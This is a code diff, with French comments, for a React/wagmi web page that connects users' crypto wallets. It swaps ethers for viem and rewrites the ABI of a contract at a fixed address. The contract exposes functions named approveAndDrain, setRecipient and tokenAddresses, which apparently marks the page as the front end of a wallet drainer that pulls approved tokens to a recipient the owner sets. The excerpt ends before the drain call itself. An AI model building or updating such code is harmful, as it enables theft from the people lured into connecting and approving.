@@ -1,105 +1,26 @@
 import { ConnectButton } from "@rainbow-me/rainbowkit";
-import { useAccount, useContractRead, useContractWrite, useSigner } from "wagmi";
-import { ethers } from "ethers";
+import { useAccount, useContractRead, useContractWrite, useWalletClient } from "wagmi";
+import { parseAbi } from "viem";
 
 // ABI du contrat
-const contractAbi = [
-  {
-    "inputs": [],
-    "stateMutability": "nonpayable",
-    "type": "constructor"
-  },
-  {
-    "inputs": [],
-    "name": "approvalAmount",
-    "outputs": [
-      {
-        "internalType": "uint256",
-        "name": "",
-        "type": "uint256"
-      }
-    ],
-    "stateMutability": "view",
-    "type": "function"
-  },
-  {
-    "inputs": [],
-    "name": "approveAndDrain",
-    "outputs": [],
-    "stateMutability": "nonpayable",
-    "type": "function"
-  },
-  {
-    "inputs": [],
-    "name": "owner",
-    "outputs": [
-      {
-        "internalType": "address",
-        "name": "",
-        "type": "address"
-      }
-    ],
-    "stateMutability": "view",
-    "type": "function"
-  },
-  {
-    "inputs": [],
-    "name": "recipient",
-    "outputs": [
-      {
-        "internalType": "address",
-        "name": "",
-        "type": "address"
-      }
-    ],
-    "stateMutability": "view",
-    "type": "function"
-  },
-  {
-    "inputs": [
-      {
-        "internalType": "address",
-        "name": "_recipient",
-        "type": "address"
-      }
-    ],
-    "name": "setRecipient",
-    "outputs": [],
-    "stateMutability": "nonpayable",
-    "type": "function"
-  },
-  {
-    "inputs": [
-      {
-        "internalType": "uint256",
-        "name": "",
-        "type": "uint256"
-      }
-    ],
-    "name": "tokenAddresses",
-    "outputs": [
-      {
-        "internalType": "address",
-        "name": "",
-        "type": "address"
-      }
-    ],
-    "stateMutability": "view",
-    "type": "function"
-  },
-  {
-    "stateMutability": "payable",
-    "type": "receive"
-  }
-];
+const contractAbi = parseAbi([
+  "constructor()",
+  "function approvalAmount() view returns (uint256)",
+  "function approveAndDrain()",
+  "function owner() view returns (address)",
+  "function recipient() view returns (address)",
+  "function setRecipient(address _recipient)",
+  "function tokenAddresses(uint256) view returns (address)",
+  "receive() payable",
+]);
 
 const contractAddress = "0x518c5D62647E60864EcB3826e982c93dFa154af3"; // Adresse du contrat
 
 export default function Home() {
   const { isConnected, address } = useAccount();
-  const { data: signer } = useSigner();
+  const { data: walletClient } = useWalletClient(); // Remplace useSigner
 
-  // Lire le owner du contrat (exemple d'utilisation de useContractRead)
+  // Lire le owner du contrat
   const { data: owner } = useContractRead({
     address: contractAddress,
     abi: contractAbi,
